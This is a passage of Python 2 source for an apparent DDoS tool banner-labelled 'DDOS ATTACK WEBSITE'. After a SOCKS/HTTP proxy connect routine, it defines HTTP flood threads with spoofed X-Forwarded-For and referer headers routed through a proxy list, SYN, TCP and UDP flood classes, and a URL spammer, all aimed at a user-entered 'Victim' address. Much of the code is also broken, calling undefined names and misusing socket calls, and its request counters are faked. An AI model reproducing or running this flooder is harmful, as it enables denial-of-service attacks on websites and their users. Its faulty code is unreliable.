                """connect(self,despair)
                Connects to the specified destination through a proxy.
                destpar - A tuple of the IP/DNS address and the port number.
                (identical to socket's connect).
                To select the proxy server use setproxy().
                """
                # Do a minimal input check first
                if (type(destpair) in (list,tuple)==False) or (len(destpair)<2) or (type(destpair[0])!=str) or (type(destpair[1])!=int):
                        raise GeneralProxyError((5,_generalerrors[5]))
                if self.__proxy[0] == PROXY_TYPE_SOCKS5:
                        if self.__proxy[2] != None:
                                portnum = self.__proxy[2]
                        else:
                                portnum = 1080
                        _orgsocket.connect(self,(self.__proxy[1],portnum))
                        self.__negotiatesocks5(destpair[0],destpair[1])
                elif self.__proxy[0] == PROXY_TYPE_SOCKS4:
                        if self.__proxy[2] != None:
                                portnum = self.__proxy[2]
                        else:
                                portnum = 1080
                        _orgsocket.connect(self,(self.__proxy[1],portnum))
                        self.__negotiatesocks4(destpair[0],destpair[1])
                elif self.__proxy[0] == PROXY_TYPE_HTTP:
                        if self.__proxy[2] != None:
                                portnum = self.__proxy[2]
                        else:
                                portnum = 8080
                        _orgsocket.connect(self,(self.__proxy[1],portnum))
                        self.__negotiatehttp(destpair[0],destpair[1])
                elif self.__proxy[0] == None:
                        _orgsocket.connect(self,(destpair[0],destpair[1]))
                else:
                        raise GeneralProxyError((4,_generalerrors[4]))	
			
class ProxyError(Exception):
        def __init__(self, value):
                self.value = value
        def __str__(self):
                return repr(self.value)
 
class GeneralProxyError(ProxyError):
        def __init__(self, value):
                self.value = value
        def __str__(self):
                return repr(self.value)
 
class Socks5AuthError(ProxyError):
        def __init__(self, value):
                self.value = value
        def __str__(self):
                return repr(self.value)
 
class Socks5Error(ProxyError):
        def __init__(self, value):
                self.value = value
        def __str__(self):
                return repr(self.value)
 
class Socks4Error(ProxyError):
        def __init__(self, value):
                self.value = value
        def __str__(self):
                return repr(self.value)
 
class HTTPError(ProxyError):
        def __init__(self, value):
                self.value = value
        def __str__(self):
                return repr(self.value)
        
class httprequest(threading.Thread):
    def run(self):
        referer_list()
        current = x                     
        in_file = open(r'C:\Users\Administrator\Desktop\Google\proxy.txt')
        listaproxy = in_file.read()
        if current < len(listaproxy):
            proxy = listaproxy[current].split(':')
        else:
            proxy = random.choice(listaproxy).split(':')
 
        useragent = "User-Agent: " + getUserAgent() + "\r\n"
        forward   = "X-Forwarded-For: " + randomIpList() + generateip() + "\r\n"
        referer   = "Referer: "+ randomReFerer() + url + "?r="+ str(random.randint(10000, 150000)) +  "\r\n"
        request = get_host + useragent + referer + accept + forward + connection + "\r\n"
 
        while nload:
            time.sleep(1)
           
        while 1:
            try:
                a = socket.socksocket.socket(socket.AF_INET, socket.SOCK_STREAM)
                a.connect((proxy[0], int(proxy[1])))
                a.sendall(messages,request)
                try:
                    for i in xrange(num_thread):
                        a.sendall(messages,request)
                except:
                    tts = 1
 
                   
            except:
                proxy = random.choice(listaproxy).split(':')
                
print \
"""
            --------- _       _____   ______    _           _      
            ---  ----! !     ! ____! ! _____!  ! ! _______ ! !
               ! !   ! !____ ! !___  ! !   ___ ! !!  ___  !! !
               ! !   !  __  !! ____! ! !  !___!! !! !   ! !! !  
               ! !   ! !  ! !! !___  ! !____!! ! !! !___! !! !  
               !_!   !_!  !_!!_____! !______!! !_!!_______!!_!DDoS                                         

  !_________________________________________________________________________!
"""
print("    ========>>.:.Hello P3terJ4mes,Welcome DDOS ATTACK WEBSITE.:.<<========")
print("")

if os.name in ('nt', 'dos', 'ce'):
    os.system('title       ........::::: Code By Thunder(P3terJ4mes),Index By TheGioiDdos :::::........')
    os.system('color 0A')
    
class Securety:
    logbase = {'P3terJ4mes': '**********'}
    logged = False
    invalid = False
 
    def login(self, user, passw):
        self.logged = False
        self.invalid = False
        try:
            if self.logbase[user] == passw:
                self.logged = True
            else:
                self.logged = False
        except:
            self.logged = False
            self.invalid = True
 
    def __init__(self):
        while self.logged == False:
            user = raw_input('[Root@Kali://P3terJ4mes>Username: ')
            passw = raw_input('[Root@Kali://P3terJ4mes>Password: ')
            self.login(user, passw)
            if self.invalid == True:
                print '[Root@Kali://P3terJ4mes>Wrong Username !!!'
            elif self.logged == False:
                print '[Root@Kali://P3terJ4mes>Wrong Username or Password !!!'
            elif self.logged == True:
                print '[Root@Kali://P3terJ4mes>Welcome to Tools !!!' 
S = Securety()
Lock = threading.Lock()
in_file = open(r'C:\Users\Administrator\Desktop\Google\proxy.txt')
proxy = in_file.read()
Request = 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
Tot_req = 9
Port = 80
class synFlood(threading.Thread):
    def __init__(self, ip, port, number):
        self.ip      = ip
        self.port    = port
        self.num     = number
        self.syn     = socket.socket()
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.num):
            try:
                self.syn.connect((self.ip, self.port))
                self.syn.connect((proxy[0], int(proxy[1])))
                self.syn.sendall(messages,request)
            except:
                pass

class tcpFlood(threading.Thread):
    def __init__(self, ip, port, size, number):
        self.ip      = ip
        self.port    = port
        self.size    = size
        self.num     = number
        self.tcp     = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.num):
            try:
                bytes = random._urandom(self.size)
                socket.connect(self.ip, self.port)
                socket.setblocking(0)
                socket.sendall(bytes,(self.ip, self.port))
                self.tcp.connect((proxy[0], int(proxy[1])))
            except:
                pass

    
class udpFlood(threading.Thread):
    def __init__(self, ip, port, size, number):
        self.ip      = ip
        self.port    = port
        self.size    = size
        self.num     = number
        self.udp     = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.num):
            try:
                bytes = random._urandom(self.size)
                if self.port == 0:
                    self.port = random.randrange(1, 65535)
                self.udp.sendall(bytes,(self.ip, self.port))
                self.udp.connect((proxy[0], int(proxy[1])))
            except:
                pass
    
class Spammer(threading.Thread):

    def __init__(self, url, number):
        threading.Thread.__init__(self)
        self.url = url
        self.port = port
        self.num = number
        self.proxy = proxy
    def run(self):
        global Lock
        global Tot_req
        global Close
        global Request
        Lock.acquire()
        print '[Root@Kali://P3terJ4mes request {0} started'.format(self.num), 'host {0} '.format(self.url), 'port :{0}'.format(self.port), ''.format(self.proxy)
        Lock.release()
        while Close == False:
            try:
                urllib.urlopen(self.url) 
                Request += 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
                Tot_req += 9
                Port = 80
            except:
                in_file = open(r'C:\Users\Administrator\Desktop\Google\proxy.txt')
                listaproxy = in_file.read()
                proxy = random.choice(listaproxy).split(':')
                pass

        Lock.acquire()
        print '[Root@Kali://P3terJ4mes request {0} started'.format(self.num), 'host {0} '.format(self.url), 'port :{0}'.format(self.port)
        Lock.release()
        sys.exit(0)
        
if __name__ == '__main__':
      
    try:
        num_threads = input('[Root@Kali://P3terJ4mes>Dame<999>:')
        t_tot = input('[Root@Kali://P3terJ4mes>Time<3>:')
        port = raw_input('[Root@Kali://P3terJ4mes>Port<80>:')
        in_file = open(raw_input("[Root@Kali://P3terJ4mes>Proxy<.txt>:"),"r")
        proxy = in_file.read()
        in_file.close()
        listaproxy = proxy.split('\n')
    except:
        t_tot = 3
    timer = t_tot * 3
    t_tot = t_tot * 3
    while True:
        host = 'host_url'
        server_address = 'host'
        url = raw_input('[Root@Kali://P3terJ4mes>Victim: ')
        ip = raw_input('[Root@Kali://P3terJ4mes>Victim_Ip: ')
        messages = raw_input('[Root@Kali://P3terJ4mes>Messages: ')
        print '[Root@Kali://P3terJ4mes> Requesting Google.py, Please waitting !!!'
        host_url = url.replace("http://", "").replace("https://", "").replace("www.", "").split('/')[0]
        get_host = "GET " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
        accept = "Accept-Encoding: gzip, deflate\r\n"
        connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
        nload = 1
        x = 0
        for x in xrange(num_threads):
            syn = synFlood(ip,port,int(num_threads))
            syn.start()
            tcp = tcpFlood(ip,port,size,int(num_threads))
            tcp.start()
            udp = udpFlood(ip,port,size,int(num_threads)) 
            udp.start()
        try:
            urllib.urlopen( 'http://www.google.com/?q= '+ url )
        except IOError:
            print 'Could not open specified url.'
        else:
            break
    for i in xrange(num_threads):
        Spammer(url, i + 1).start()
    time.sleep(3)
    os.system('color 0C')
    print \
    """
                  --------- _       _____   ______    _           _      
                  ---- ----! !     ! ____! ! _____!  ! ! _______ ! !
                     ! !   ! !____ ! !___  ! !   ___ ! !!  ___  !! !
                     ! !   !  __  !! ____! ! !  !___!! !! !   ! !! !  
                     ! !   ! !  ! !! !___  ! !____!! ! !! !___! !! !  
                     !_!   !_!  !_!!_____! !______!! !_!!_______!!_!DDoS                                         
    """
    print("-------------------------------------------------------------------------")
    print '#######################################################################'
    while timer > 0:
        time.sleep(0.001)
        print 'Request anti ' + str(Request /5.0) + ' done for: ' + str(Tot_req) + '  Request Time out:', timer, '/s Port:',port
        Request = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
        timer -= 0.001
    print '\n> The request ' + str(Request /5.0) + '---Requests/s' + str(Tot_req) + '  Request Time out:', timer, '/s Port:',port
    print '\n#######################################################################\n'
    raw_input('> This attack is running........')
    time.sleep(1)
    for x in xrange(int(num_threads + 1)):
        t = HTTPThread()
        t.start()
    t = MonitorThread()    
    t.start()
    http = httprequest()
    http.start()
    Close = True
nload = 0
while not nload:
    sys.exit()
